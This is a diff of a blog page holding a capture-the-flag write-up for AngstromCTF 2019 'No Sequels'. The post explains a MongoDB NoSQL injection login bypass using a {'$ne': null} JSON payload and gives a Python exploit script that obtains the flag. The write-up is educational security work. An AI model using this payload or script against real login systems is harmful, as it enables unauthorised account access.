@@ -61,9 +61,9 @@
     "name" : "CHERIEF Yassine (omega_coder)"
   },
   "headline": "Angstromctf 2019 | No Sequels and No Sequels2 Web Writeup",
-  "description" : "",
+  "description" : "This blog post contains the writeup for two challenges (No SEQUELS \x26amp; No SEQUELS 2), because they are related.\nSo let\x26rsquo;s start with No SEQUELS first.\nCategory: Web\nPoints: 50\nChallenge Description  The prequels sucked, and the sequels aren\x26rsquo;t much better, but at least we always have the original trilogy.\nHint said : MongoDB is a safer alternative to SQL, right?\n What we can get from the informations stated above ?",
   "inLanguage" : "en",
-  "wordCount":  0 ,
+  "wordCount":  512 ,
   "datePublished" : "2019-04-26T01:49:01",
   "dateModified" : "2019-04-26T01:49:01",
   "image" : "https:\/\/omega-coder.me\/img\/profile_pic.jpg",
@@ -265,10 +265,10 @@ if (!doNotTrack) {
   <i class="fas fa-calendar"></i>&nbsp;Posted on April 26, 2019
   
   
-    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;0&nbsp;minutes
+    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;3&nbsp;minutes
   
   
-    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;0&nbsp;words
+    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;512&nbsp;words
   
   
     &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;CHERIEF Yassine (omega_coder)
@@ -328,79 +328,93 @@ if (!doNotTrack) {
 <p>After reading the code, this is clearly a NoSQL Injection because of unsanitized user input.</p>
 
 <p>The following two lines show that the variables username and password are not sanitized by anyway.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span>;
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">pass</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>;
-</code></pre></div>
+
+<pre><code class="language-js">var user = req.body.username;
+var pass = req.body.password;
+</code></pre>
+
 <p>One more thing to notice, the line below show that the body can be parser using json regarded that we supply some json input with <code>Content-Type: application/json</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>());
-</code></pre></div>
+
+<pre><code class="language-js">app.use(bodyParser.json());
+</code></pre>
+
 <p>NoSQL databases are still potentially vulnerable to injection attacks, even if they aren&rsquo;t using the traditional <code>SQL</code> syntax.</p>
 
 <p>The unsanitisation of username and password will lead to NoSQL code injection.</p>
 
 <p>What would happen if we post the following JSON data:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> https://nosequels.2019.chall.actf.co <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
-Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
-<span style="color:#960050;background-color:#1e0010">{</span>
-    <span style="color:#e6db74">&#34;username&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#66d9ef">null</span>}<span style="color:#960050;background-color:#1e0010">,</span>
-    <span style="color:#e6db74">&#34;password&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#66d9ef">null</span>}
-<span style="color:#960050;background-color:#1e0010">}</span></code></pre></div>
+
+<pre><code class="language-http">POST https://nosequels.2019.chall.actf.co HTTP/1.1
+Content-Type: application/json
+{
+    &quot;username&quot;: {&quot;$ne&quot;: null},
+    &quot;password&quot;: {&quot;$ne&quot;: null}
+}
+</code></pre>
+
 <p>By Sending this payload the username &amp; password will be parsed as so, thus the query being</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> {
-    <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#34;$ne&#34;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>};
-    <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#34;$ne&#34;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>};
+
+<pre><code class="language-javascript">var query = {
+    username: {&quot;$ne&quot;: null};
+    password: {&quot;$ne&quot;: null};
 }
     
-</code></pre></div>
+</code></pre>
+
 <p>Now, executing the line below from the app source code will return the first row, and we will be authenticated.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">collection</span>(<span style="color:#e6db74">&#39;users&#39;</span>).<span style="color:#a6e22e">findOne</span>(<span style="color:#a6e22e">query</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">user</span>) {
-    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">user</span>) {
-        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Wrong username or password&#34;</span>);
-        <span style="color:#66d9ef">return</span> 
+
+<pre><code class="language-javascript">db.collection('users').findOne(query, function(err, user) {
+    if (!user) {
+        res.send(&quot;Wrong username or password&quot;);
+        return 
     }
-    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">cookie</span>(<span style="color:#e6db74">&#39;token&#39;</span>, <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">sign</span>({<span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">authnticated</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>}, <span style="color:#a6e22e">secret</span>));
-    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/site&#34;</span>);
+    res.cookie('token', jwt.sign({name: user.username, authnticated: true}, secret));
+    res.redirect(&quot;/site&quot;);
 });
-</code></pre></div>
+</code></pre>
+
 <p>Let&rsquo;s write a script to do the work for us, and get that first <code>FLAG</code>.</p>
 
 <p>We will be using python requests module.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
-<span style="color:#f92672">import</span> re
-URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://nosequels.2019.chall.actf.co/login&#34;</span>
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;username&#34;: {&#34;$ne&#34;: null}, &#34;password&#34;: {&#34;$ne&#34;: null}}&#39;</span>
-cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;token&#34;</span>: <span style="color:#e6db74">&#34;still_dont_know&#34;</span>} 
-<span style="color:#75715e"># we could have done it manually, and replaced the token with</span>
-<span style="color:#75715e"># the token that your browser got for you</span>
 
-<span style="color:#75715e"># init session</span>
-session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
-<span style="color:#75715e"># set re expression for token in headers</span>
-jwt_token_re <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;token=(.*);&#34;</span>)
-<span style="color:#75715e"># Getting the token for the first time</span>
+<pre><code class="language-python">import requests
+import re
+URL = &quot;https://nosequels.2019.chall.actf.co/login&quot;
+payload = '{&quot;username&quot;: {&quot;$ne&quot;: null}, &quot;password&quot;: {&quot;$ne&quot;: null}}'
+cookies = {&quot;token&quot;: &quot;still_dont_know&quot;} 
+# we could have done it manually, and replaced the token with
+# the token that your browser got for you
 
-token_req <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(URL)
-<span style="color:#66d9ef">if</span> token_req<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
-    m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(jwt_token_re, token_req<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Set-Cookie&#34;</span>])
-    <span style="color:#66d9ef">if</span> m:
-        <span style="color:#75715e"># update token in cookies dict</span>
-        cookies[<span style="color:#e6db74">&#34;token&#34;</span>] <span style="color:#f92672">=</span> str(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>))
+# init session
+session = requests.Session()
+# set re expression for token in headers
+jwt_token_re = re.compile(r&quot;token=(.*);&quot;)
+# Getting the token for the first time
 
-    <span style="color:#75715e"># Now let&#39;s send the json payload alongside the cookie we got above.</span>
-    <span style="color:#75715e"># we will leave requests default behaviour to follow redirects which will redirect us to /site</span>
+token_req = session.get(URL)
+if token_req.status_code == 200:
+    m = re.search(jwt_token_re, token_req.headers[&quot;Set-Cookie&quot;])
+    if m:
+        # update token in cookies dict
+        cookies[&quot;token&quot;] = str(m.group(1))
 
-flag_re <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;actf{.*}&#34;</span>)
+    # Now let's send the json payload alongside the cookie we got above.
+    # we will leave requests default behaviour to follow redirects which will redirect us to /site
 
-<span style="color:#75715e"># make request with mallicious payload</span>
+flag_re = re.compile(r&quot;actf{.*}&quot;)
 
-req <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(URL, json<span style="color:#f92672">=</span>payload, cookies<span style="color:#f92672">=</span>cookies, verify<span style="color:#f92672">=</span>False)
-<span style="color:#75715e"># verify=False is just for HTTPS connection</span>
+# make request with mallicious payload
 
-<span style="color:#66d9ef">if</span> req<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
-    <span style="color:#75715e"># FLAG match</span>
-    m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(flag_re, req<span style="color:#f92672">.</span>text)
-    <span style="color:#66d9ef">if</span> m:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;1st FLAG: &#34;</span>, m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">0</span>)) </code></pre></div>
+req = session.post(URL, json=payload, cookies=cookies, verify=False)
+# verify=False is just for HTTPS connection
+
+if req.status_code == 200:
+    # FLAG match
+    m = re.search(flag_re, req.text)
+    if m:
+        print(&quot;1st FLAG: &quot;, m.group(0)) 
+</code></pre>
+
 <p><strong><code>FLAG is : actf{no_sql_doesn’t_mean_no_vuln}</code></strong></p>
 
 
